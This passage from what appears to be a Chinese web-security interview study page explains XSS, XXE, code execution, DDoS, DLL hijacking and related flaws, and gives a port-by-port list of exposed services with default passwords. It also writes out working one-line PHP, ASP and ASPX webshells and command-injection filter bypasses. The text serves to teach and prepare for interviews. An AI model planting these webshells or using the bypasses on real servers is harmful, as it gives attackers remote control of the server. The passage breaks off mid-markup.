<h2 id="07-XSS漏洞"><a href="#07-XSS漏洞" class="headerlink" title="07-XSS漏洞"></a>07-XSS漏洞</h2><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">原理: 通过插入恶意脚本，实现对用户浏览器的攻击<br>类型: 存储、反射、dom<br>反射和dom的区别: DOM-XSS是javascript处理输出， 而反射性xss是后台程序处理<br><br>XSS绕过：<br><span class="hljs-number">1.</span>大小写<br><span class="hljs-number">2.</span>js伪协议<br><span class="hljs-number">3.</span>没有分号<br><span class="hljs-number">4.</span>Flash<br><span class="hljs-number">5.</span>Html5新标签<br><span class="hljs-number">6.</span>Fuzz进行测试<br><span class="hljs-number">7.</span>双层标签绕过<br><br>修复防御：<br><span class="hljs-number">1.</span>对输入内容的特定字符进行编码，例如表示html标记的 &lt; &gt; 等符号。 <br><span class="hljs-number">2.</span>对重要的cookie设置httpOnly, 防止客户端通过document.cookie读取 cookie，此HTTP头由服务端设置。 <br><span class="hljs-number">3.</span>将不可信的值输出<span class="hljs-built_in">URL</span>参数之前，进行<span class="hljs-built_in">URLEncode</span>操作，而对于从<span class="hljs-built_in">URL</span>参数中获取值一定要进行格式检测（比如你需要的时<span class="hljs-built_in">URL</span>，就判读是否满足<span class="hljs-built_in">URL</span>格式）。 <br><span class="hljs-number">4.</span>不要使用Eval来解析并运行不确定的数据或代码，对于JSON解析请使用 JSON.parse()方法。 <br></code></pre></td></tr></table></figure>

<h2 id="08-XXE漏洞？"><a href="#08-XXE漏洞？" class="headerlink" title="08-XXE漏洞？"></a>08-XXE漏洞？</h2><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">原理: 解析用户传入的<span class="hljs-keyword">xml</span><br><span class="hljs-title">作用: 内网端口扫描、利用file</span>协议等读取文件、攻击内网web应用使用<br>get(struts2等)<br><br>危害：<br><span class="hljs-number">1</span>.导致可以加载恶意外部文件<br><span class="hljs-number">2</span>.造成文件读取<br><span class="hljs-number">3</span>.内网端口扫描<br><span class="hljs-number">4</span>.攻击内网网站<br><span class="hljs-number">5</span>.发起dos攻击等危害<br><br>防御: 过滤用户提交的XML数据、如果你当前使用的程序为PHP，则可以将libxml_disable_entity_loader设置为<span class="hljs-literal">TRUE</span>来禁用外部实体，从而起到防御的目的<br></code></pre></td></tr></table></figure>

<h2 id="09-代码执行漏洞"><a href="#09-代码执行漏洞" class="headerlink" title="09-代码执行漏洞"></a>09-代码执行漏洞</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">原理：没有对接口输入的内容进行严格的判断 造成攻击者精心构造的代码非法执行<br> <br> 当应用在调用一些能将字符转化为代码的函数(如PHP中的<span class="hljs-built_in">eval</span>)时，没有考虑用户是否能控制这个字符串，这就会造成代码执行漏洞。<br><br>相关函数：<br>PHP：<span class="hljs-built_in">eval</span> assert<br>Python：<span class="hljs-built_in">exec</span><br>asp：&lt;%=CreateObject(“wscript.shell”).<span class="hljs-built_in">exec</span>(“cmd.exe /c ipconfig”).StdOut.ReadAll()%&gt;<br><br>危害：<br> 执行代码<br> 让网站写shell<br> 甚至控制服务器<br><br>漏洞利用：<br>执行代码的函数：<span class="hljs-built_in">eval</span>、assert<br>callback函数：preg_replace + /e模式<br>反序列化：unserialize()(反序列化函数)<br><br>防御修复：<br>  1.使用json保存数组，当读取时就不需要使用<span class="hljs-built_in">eval</span>了<br>  2.对于必须使用<span class="hljs-built_in">eval</span>的地方，一定严格处理用户数据<br>  3.字符串使用单引号包括可控代码，插入前使用addslashes转义<br>  4.放弃使用preg_replace的e修饰符，使用preg_replace_callback()替换<br>  5.若必须使用preg_replace的e修饰符，则必用单引号包裹正则匹配出的对象<br></code></pre></td></tr></table></figure>

<h2 id="10-关于路径覆盖漏洞（不常问）"><a href="#10-关于路径覆盖漏洞（不常问）" class="headerlink" title="10.关于路径覆盖漏洞（不常问）"></a>10.关于路径覆盖漏洞（不常问）</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">RPO的全称为Relative Path Overwrite,也就是相对路径覆盖，利用客户端和服务端的差异，通过相对路径来引入我们想要的<span class="hljs-keyword">js</span>或css文件，从而实现某种攻击。<br><br>就目前来看此攻击方法依赖于浏览器和网络服务器的反应，基于服务器的Web缓存技术和配置差异，以及服务器和客户端浏览器的解析差异，利用前端代码中加载的css/<span class="hljs-keyword">js</span>的相对路径来加载其他文件，最终浏览器将服务器返回的不是css/<span class="hljs-keyword">js</span>的文件当做css/<span class="hljs-keyword">js</span>来解析，从而导致XSS，信息泄露等漏洞产生。<br></code></pre></td></tr></table></figure>

<h2 id="11-邮件系统漏洞攻击"><a href="#11-邮件系统漏洞攻击" class="headerlink" title="11.邮件系统漏洞攻击"></a>11.邮件系统漏洞攻击</h2><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">漏洞攻击是危害网络安全中较为常见的一种。作为当今世界上使用最为频繁的商务通信工具——邮件系统，更是屡屡遭受漏洞攻击的困扰，这不仅因为制造漏洞的途径多，还以为邮件系统的互联网通信协议本身的问题。前者如程序员因为工作失误出现编码漏洞，毕竟人非机器，在紧张复杂的工作过程中，难免有个闪失，除了人为因素，还有软件编码工具及编译器造成的错误，不同应用程序彼此之间的相互作用，如大多数程序必须与其它API相交互，保存并检索文件，同时运行在多种不同类型的设备上，都会可能产生漏洞；后者如互联网通信协议—TCP和UDP，其开放性常常引来黑客的攻击；而IP地址的脆弱性，也给黑客的伪造提供了可能，从而泄露远程服务器的资源信息。<br><br>除了以上原因，据业界知名邮件通联服务商U-Mail专家张工分析，常见漏洞大概可分为几种：<br><br>一、IMAP 和 <span class="hljs-keyword">POP</span> 漏洞：<br>这些协议常见弱点是密码脆弱，同时，各种IMAP和<span class="hljs-keyword">POP</span>服务还容易受到如缓冲区溢出等类型的攻击。<br><br>二、拒绝服务（DoS）攻击：<br><span class="hljs-number">1.</span>死亡之<span class="hljs-built_in">Ping</span>——发送一个无效数据片段，该片段始于包结尾之前，但止于包结尾之后；<br><span class="hljs-number">2.</span>同步攻击——极快地发送TCP SYN包（它会启动连接），使受攻击的机器耗尽系统资源，进而中断合法连接；<br><span class="hljs-number">3.</span>循环——发送一个带有完全相同的源／目的地址／端口的伪造SYN包，使系统陷入一个试图完成TCP连接的无限循环中。<br><br>三、系统配置漏洞：<br><span class="hljs-number">1.</span>默认配置——大多数系统在交付给客户时都设置了易于使用的默认配置，被黑客盗用变得轻松；<span class="hljs-number">2.</span>空的／默认根密码——许多机器都配置了空的或默认的根／管理员密码，并且其数量多得惊人；<br><br><span class="hljs-number">3.</span>漏洞创建——几乎所有程序都可以配置为在不安全模式下运行，这会在系统上留下不必要的漏洞。<br><br>四、利用软件问题：在服务器守护程序、客户端应用程序、操作系统和网络堆栈中，存在很多的软件错误，分为以下几类：<br><span class="hljs-number">1.</span>缓冲区溢出——程序员会留出一定数目的字符空间来容纳登录用户名，黑客则会通过发送比指定字符串长的字符串，其中包括服务器要执行的代码，使之发生数据溢出，造成系统入侵。<br><span class="hljs-number">2.</span>意外组合——程序通常是用很多层代码构造而成的，入侵者可能会经常发送一些对于某一层毫无意义，但经过适当构造后对其他层有意义的输入。<br><span class="hljs-number">3.</span>未处理的输入——大多数程序员都不考虑输入不符合规范的信息时会发生什么。<br></code></pre></td></tr></table></figure>

<h2 id="12-DNS欺骗是什么？"><a href="#12-DNS欺骗是什么？" class="headerlink" title="12-DNS欺骗是什么？"></a>12-DNS欺骗是什么？</h2><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs armasm">定义：DNS欺骗就是攻击者冒充域名服务器的一种欺骗行为。 <br>原理：如果可以冒充域名服务器，然后把查询的<span class="hljs-built_in">IP</span>地址设为攻击者的<span class="hljs-built_in">IP</span>地址，这样的话，用户上网就只能看到攻击者的主页，而不是用户想要取得的网站的主页了，这就是DNS欺骗的基本原理。<br><span class="hljs-symbol">DNS</span>欺骗其实并不是真的“黑掉”了对方的网站，而是冒名顶替、招摇撞骗罢了。<br></code></pre></td></tr></table></figure>

<h2 id="13-DDOS攻击"><a href="#13-DDOS攻击" class="headerlink" title="13-DDOS攻击"></a>13-DDOS攻击</h2><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs gauss">分布式拒绝服务攻击（DDoS）是目前黑客经常采用而难以防范的攻击手段。<span class="hljs-keyword">DoS</span>的攻击方式有很多种，最基本的<span class="hljs-keyword">DoS</span>攻击就是利用合理的服务请求来占用过多的服务资源，从而使合法用户无法得到服务的响应。<br>抗D思想和方案<br>  负载均衡<br>  花钱买流量清洗服务<br>  CDN：web层，比如cc攻击<br>  分布式集群防御<br>  高防：防大部分攻击，udp、大型的cc攻击<br>预防为主<br>  系统漏洞<br>  系统资源优化：<br>  过滤不必要的服务和端口<br>  限制特定流量：检查访问来源做适当限制<br></code></pre></td></tr></table></figure>

<h2 id="14-什么是CC攻击？"><a href="#14-什么是CC攻击？" class="headerlink" title="14-什么是CC攻击？"></a>14-什么是CC攻击？</h2><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">CC</span>攻击是DDOS（分布式拒绝服务）的一种，相比 <br>其它的DDOS攻击<span class="hljs-keyword">CC</span>似乎更有技术含量一些。这种攻击你见不到真实源IP，见不到特别大的异常流量，但造成服务器无法进行正常连接。<span class="hljs-keyword">CC</span>攻击的原理就 是攻击者控制某些主机不停地发大量数据包给对方服务器造成服务器资源耗尽， 一直到宕机溃。<span class="hljs-keyword">CC</span>主要是用来攻击页面的，每个人都有这样的体验：当一个 网页访问的人数特别多的时候，打开网页就慢了，<span class="hljs-keyword">CC</span>就是模拟多个用户（多少 线程就是多少用户）不停地进行访问那些需要大量数据操作（就是需要大量CPU时间）的页面，造成服务器资源的浪费，CPU长时间处100%，永远都有处 理不完的连接直至就网络拥塞，正常的访问被中止。<br></code></pre></td></tr></table></figure>

<h2 id="15-常见的端口和对应的服务"><a href="#15-常见的端口和对应的服务" class="headerlink" title="15-常见的端口和对应的服务"></a>15-常见的端口和对应的服务</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-number">1</span><span class="hljs-string">、web类</span><br><span class="hljs-string">这部分常有的漏洞有：（web漏洞/敏感目录）第三方通用组件漏洞struts、thinkphp、jboss、ganglia、zabbix</span><br><span class="hljs-number">80</span> <span class="hljs-string">web</span><br><span class="hljs-number">80</span><span class="hljs-number">-89</span> <span class="hljs-string">web</span><br><span class="hljs-number">8000</span><span class="hljs-number">-9090</span> <span class="hljs-string">web</span><br><br><span class="hljs-number">2</span><span class="hljs-string">、数据库类（扫描弱口令）</span><br><span class="hljs-number">1433  </span><span class="hljs-string">MSSQL</span><br><span class="hljs-number">1521  </span><span class="hljs-string">Oracle</span><br><span class="hljs-number">3306  </span><span class="hljs-string">MySQL</span><br><span class="hljs-number">5432  </span><span class="hljs-string">PostgreSQL</span><br><br><span class="hljs-number">3</span><span class="hljs-string">、特殊服务类（未授权/命令执行/漏洞）</span><br><span class="hljs-number">443</span>  <span class="hljs-string">SSL心脏滴血</span><br><span class="hljs-number">873</span>  <span class="hljs-string">Rsync未授权</span><br><span class="hljs-number">5984  </span><span class="hljs-string">CouchDB</span> <span class="hljs-string">http://xxx:5984/_utils/</span><br><span class="hljs-number">6379  </span><span class="hljs-string">redis未授权</span><br><span class="hljs-number">7001</span><span class="hljs-string">、7002</span>  <span class="hljs-string">weblogic默认弱口令、反序列化</span><br><span class="hljs-number">9200</span><span class="hljs-string">、9300</span>  <span class="hljs-string">elasticsearch</span>  <span class="hljs-string">参考乌云：多玩某服务器ElasticSearch命令执行漏洞</span><br><span class="hljs-number">11211</span>  <span class="hljs-string">memcache未授权访问</span><br><span class="hljs-number">50000</span>  <span class="hljs-string">SAP命令执行</span><br><span class="hljs-number">50070</span><span class="hljs-string">、50030</span>  <span class="hljs-string">hadoop默认端口未授权访问</span><br><br><span class="hljs-number">4</span><span class="hljs-string">、常用端口类（扫描弱口令/端口爆破）</span><br><span class="hljs-number">21</span>  <span class="hljs-string">ftp</span><br><span class="hljs-number">22</span>  <span class="hljs-string">ssh</span><br><span class="hljs-number">23</span>  <span class="hljs-string">telnet</span><br><span class="hljs-number">2601</span><span class="hljs-string">、2604</span>  <span class="hljs-string">zebra路由，默认密码zebra</span><br><span class="hljs-number">3389</span>  <span class="hljs-string">远程桌面</span><br><br><span class="hljs-string">常见的端口漏洞</span><br><span class="hljs-number">21</span> <span class="hljs-string">ftp</span> <span class="hljs-string">FTP服务端有很多</span>  <span class="hljs-string">anonymous</span> <span class="hljs-string">匿名未授权访问</span> <span class="hljs-string">爆破</span><br><span class="hljs-number">22</span> <span class="hljs-string">ssh</span> <span class="hljs-string">root密码爆破</span>  <span class="hljs-string">后门用户</span> <span class="hljs-string">可以google查一些关于ssh后门的文章</span> <span class="hljs-string">里面的默认密码</span> <span class="hljs-string">可能会登入进去</span><br><span class="hljs-number">23</span> <span class="hljs-string">telnet</span>  <span class="hljs-string">一般会发生在</span> <span class="hljs-string">路由器</span> <span class="hljs-string">或者交换机</span> <span class="hljs-string">嵌入式设备</span> <span class="hljs-string">管理端口</span> <span class="hljs-string">攻击方法</span> <span class="hljs-string">弱口令</span><br><span class="hljs-number">25</span> <span class="hljs-string">smtp</span>  <span class="hljs-string">默认用户</span> <span class="hljs-string">默认密码</span> <span class="hljs-string">邮件账号爆破</span><br><span class="hljs-number">80</span> <span class="hljs-string">http</span>  <span class="hljs-string">web</span>  <span class="hljs-string">常见的Owasp</span> <span class="hljs-string">top</span> <span class="hljs-number">10</span> <span class="hljs-string">中间件反序列化</span> <span class="hljs-string">中间件溢出</span>  <span class="hljs-string">fastcgi配置不当</span> <span class="hljs-string">造成fastcgi端口泄露</span><br><span class="hljs-number">110</span> <span class="hljs-string">pop3</span>  <span class="hljs-string">默认用户</span> <span class="hljs-string">默认密码</span> <span class="hljs-string">邮件账号爆破</span><br><span class="hljs-number">443</span> <span class="hljs-string">https</span>  <span class="hljs-string">openssl</span> <span class="hljs-string">心脏滴血（影响范围较小）</span> <span class="hljs-string">SSL/TLS低版本存在的漏洞</span><br><span class="hljs-number">135</span> <span class="hljs-number">139</span> <span class="hljs-number">445</span> <span class="hljs-string">netbios</span> <span class="hljs-string">smb</span>  <span class="hljs-string">MS17010</span>  <br><span class="hljs-number">3389 </span><span class="hljs-string">RDP</span>  <span class="hljs-string">CVE-2019-0708</span><br><br><span class="hljs-number">3389</span><span class="hljs-string">和443、445有什么漏洞？</span><br><span class="hljs-number">445</span><span class="hljs-string">：ms06_040，蠕虫，勒索病毒、MS17-010</span><br><span class="hljs-number">443</span><span class="hljs-string">：ssl心脏滴血</span><br><span class="hljs-number">3389</span><span class="hljs-string">：rdp漏洞、弱口令、cve-2019-0708、ms12-20</span><br><br><span class="hljs-string">端口合计详情</span><br><span class="hljs-number">161</span>  <span class="hljs-string">SNMP</span><br><span class="hljs-number">389</span>  <span class="hljs-string">LDAP</span><br><span class="hljs-number">512</span><span class="hljs-string">、513、514</span>  <span class="hljs-string">Rexec</span><br><span class="hljs-number">873</span>  <span class="hljs-string">Rsync未授权</span><br><span class="hljs-number">1025</span><span class="hljs-string">、1111</span>  <span class="hljs-string">NSF</span><br><span class="hljs-number">1433  </span><span class="hljs-string">sqlserver</span><br><span class="hljs-number">1521  </span><span class="hljs-string">Oracle：（iSqlPlus</span>  <span class="hljs-string">port：5560、7778）</span><br><span class="hljs-number">2082</span><span class="hljs-string">/2083</span>  <span class="hljs-string">cpanel主机管理系统登录</span><br><span class="hljs-number">2222  </span><span class="hljs-string">DA虚拟主机管理系统登录</span><br><span class="hljs-number">2601</span><span class="hljs-string">、2604</span>  <span class="hljs-string">zebra路由，默认密码zebra</span><br><span class="hljs-number">3128  </span><span class="hljs-string">squid代理默认端口，如果没设置口令很可能直接漫游内网</span><br><span class="hljs-number">3306  </span><span class="hljs-string">Mysql</span><br><span class="hljs-number">3312</span><span class="hljs-string">/3311</span>  <span class="hljs-string">kangle主机管理系统登录</span><br><span class="hljs-number">4440  </span><span class="hljs-string">rundeck</span>  <span class="hljs-string">参考乌云：借用新浪某服务成功漫游新浪内网</span><br><span class="hljs-number">5432  </span><span class="hljs-string">PostgreSQL</span><br><span class="hljs-number">5900  </span><span class="hljs-string">vnc</span><br><span class="hljs-number">5984  </span><span class="hljs-string">CouchDB</span>  <br><span class="hljs-number">6082  </span><span class="hljs-string">varnish</span>  <br><span class="hljs-number">6379  </span><span class="hljs-string">redis未授权</span><br><span class="hljs-number">7001</span><span class="hljs-string">、7002</span>  <span class="hljs-string">weblogic默认弱口令、反序列化</span><br><span class="hljs-number">7778  </span><span class="hljs-string">kloxo主机控制面板登录</span><br><span class="hljs-number">8000</span><span class="hljs-number">-9090</span>  <span class="hljs-string">都是一些常见的web端口，有些运维谢欢吧管理后台开放在这些非80端口上</span><br><span class="hljs-number">8080  </span><span class="hljs-string">tomcat/wDCP主机管理系统，默认弱口令</span><br><span class="hljs-number">8080</span><span class="hljs-string">、8089、9090</span>  <span class="hljs-string">jboss</span><br><span class="hljs-number">8083  </span><span class="hljs-string">Vestacp主机管理系统</span><br><span class="hljs-number">8649  </span><span class="hljs-string">ganglia</span><br><span class="hljs-number">8888  </span><span class="hljs-string">amh/LuManager</span>  <span class="hljs-string">主机管理系统默认端口</span><br><span class="hljs-number">9200</span><span class="hljs-string">、9300</span>  <span class="hljs-string">elasticsearch</span>  <span class="hljs-string">参考乌云：多玩某服务器ElasticSearch命令执行漏洞</span><br><span class="hljs-number">10000</span>  <span class="hljs-string">Virtualmin/Webmin</span>  <span class="hljs-string">服务器虚拟主机管理系统</span><br><span class="hljs-number">11211</span>  <span class="hljs-string">memcache未授权访问</span><br><span class="hljs-number">27017</span><span class="hljs-string">、27018</span>  <span class="hljs-string">Mongodb未授权访问</span><br><span class="hljs-number">28017</span>  <span class="hljs-string">mongodb统计页面</span><br><span class="hljs-number">50000</span>  <span class="hljs-string">SAP命令执行</span><br><span class="hljs-number">50070</span><span class="hljs-string">、50030</span>  <span class="hljs-string">hadoop默认端口未授权访问</span><br></code></pre></td></tr></table></figure>

<h2 id="16-身份认证漏洞最常见是？"><a href="#16-身份认证漏洞最常见是？" class="headerlink" title="16-身份认证漏洞最常见是？"></a>16-身份认证漏洞最常见是？</h2><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs erlang"><span class="hljs-number">1</span>.会话固定攻击<br><span class="hljs-number">2</span>.cookie仿冒<br>只要得到session和cookie即可伪造用户身份.<br></code></pre></td></tr></table></figure>

<h2 id="17-验证码漏洞"><a href="#17-验证码漏洞" class="headerlink" title="17-验证码漏洞"></a>17-验证码漏洞</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">1</span>.验证码漏洞存在暴力破解<br><span class="hljs-number">2</span>.可以通过<span class="hljs-keyword">js</span>或改包方法进行绕过<br></code></pre></td></tr></table></figure>

<h2 id="18-DOM-型XSS人工测试"><a href="#18-DOM-型XSS人工测试" class="headerlink" title="18-DOM 型XSS人工测试"></a>18-DOM 型XSS人工测试</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">人工测试思路：找到类似 <span class="hljs-variable language_">document</span>.<span class="hljs-property">write</span>、innerHTML赋值、outterHTML 赋值、<span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span> 操作、写<span class="hljs-attr">javascript</span>:后内容、<span class="hljs-built_in">eval</span>、<span class="hljs-built_in">setTimeout</span> 、<span class="hljs-built_in">setInterval</span> 等直接执行之类的函数点。找到其变量，回溯变量来源观察是否可控，是否经过安全函数。<br></code></pre></td></tr></table></figure>

<h2 id="19-为什么参数化查询可以防止SQL注入？"><a href="#19-为什么参数化查询可以防止SQL注入？" class="headerlink" title="19-为什么参数化查询可以防止SQL注入？"></a>19-为什么参数化查询可以防止SQL注入？</h2><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">原理: 使用参数化查询数据库服务器不会把参数的内容当作sql指令的一部分来执行，是在数据库完成sql指令的编译后才套用参数运行 </span><br><br><span class="hljs-section">简单的说: 参数化能防注入的原因在于,语句是语句，参数是参数，参数的值并不是语句的一部分，数据库只按语句的语义跑.</span><br></code></pre></td></tr></table></figure>

<h2 id="20-各种常见的状态码？"><a href="#20-各种常见的状态码？" class="headerlink" title="20.各种常见的状态码？"></a>20.各种常见的状态码？</h2><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">200 </span>OK //客户端请求成功 <br><span class="hljs-symbol">403 </span>Forbidden //服务器收到请求，但是拒绝提供服务 <br><span class="hljs-symbol">404 </span><span class="hljs-keyword">Not</span> Found //请求资源不存在，eg：输入了错误的 URL <br><span class="hljs-symbol">500 </span>Internal Server <span class="hljs-keyword">Error</span> //服务器发生不可预期的错误<br></code></pre></td></tr></table></figure>

<h2 id="21-Dll劫持漏洞"><a href="#21-Dll劫持漏洞" class="headerlink" title="21-Dll劫持漏洞"></a>21-Dll劫持漏洞</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs">由于输入表中只包含DLL名而没有它的路径名，因此加载程序必须在磁盘上搜 <br>索 DLL 文件。首先会尝试从当前程序所在的目录加载DLL，如果没找到，则在 <br>Windows系统目录中查找，最后是在环境变量中列出的各个目录下查找。利用 <br>这个特点，先伪造一个系统同名的DLL，提供同样的输出表，每个输出函数转向 <br>真正的系统DLL。程序调用系统DLL时会先调用当前目录下伪造的 DLL，完成相关功能后，再跳到系统DLL同名函数里执行。这个过程用个形象的词来描述，就是系统DLL被劫持（hijack）了。伪造的dll制作好后，放到程序当前目录下，这样当原程序调用原函数时就调用了伪造的dll的同名函数，进入劫持DLL的代码，处理完毕后，再调用原DLL此函数。<br><br>DLL劫持利用系统未知DLL的搜索路径方式，使得程序加载当前目录下的系统同名DLL。所以可以告诉系统DLL的位置，改变加载系统DLL的顺序不是当前目录，而是直接到系统目录下查找。<br></code></pre></td></tr></table></figure>

<h2 id="22-一句话木马"><a href="#22-一句话木马" class="headerlink" title="22-一句话木马"></a>22-一句话木马</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">asp一句话木马： &lt;%<span class="hljs-title function_ invoke__">execute</span>(<span class="hljs-title function_ invoke__">request</span>(<span class="hljs-string">&quot;value&quot;</span>))%&gt; <br>php一句话木马：<span class="hljs-meta">&lt;?php</span>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[value]);<span class="hljs-meta">?&gt;</span> <br>变形：<span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$x</span>=<span class="hljs-variable">$_GET</span>[‘z’];@<span class="hljs-keyword">eval</span>(“<span class="hljs-variable">$x</span>;”);<span class="hljs-meta">?&gt;</span> <br><br>aspx一句话木马： <br>&lt;%@ PageLanguage=<span class="hljs-string">&quot;Jscript&quot;</span>%&gt; <br>&lt;%<span class="hljs-keyword">eval</span>(Request.Item[<span class="hljs-string">&quot;value&quot;</span>])%&gt; <br></code></pre></td></tr></table></figure>

<h2 id="23-命令执行漏洞"><a href="#23-命令执行漏洞" class="headerlink" title="23-命令执行漏洞"></a>23-命令执行漏洞</h2><p><img src="https://img-blog.csdnimg.cn/img_convert/bf95dd787930324fbe2524633c252f94.png" srcset="/img/loading.gif" lazyload alt="图片"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs shell">绕过技巧：<br>cat 233.txt # 管道符号绕过 <br><span class="hljs-meta prompt_"># </span><span class="language-bash">空格绕过 <span class="hljs-variable">$&#123;IFS&#125;</span></span> <br><span class="hljs-meta prompt_"># </span><span class="language-bash">%0a、%09 <span class="hljs-comment"># 重定向绕过 &lt; &lt;&gt;</span></span> <br><span class="hljs-meta prompt_"># </span><span class="language-bash">变量拼接绕过 @kali:$ a=c;b=at;c=fl;d=ag;$a<span class="hljs-variable">$b</span> $c<span class="hljs-variable">$d</span></span> <br><span class="hljs-meta prompt_"># </span><span 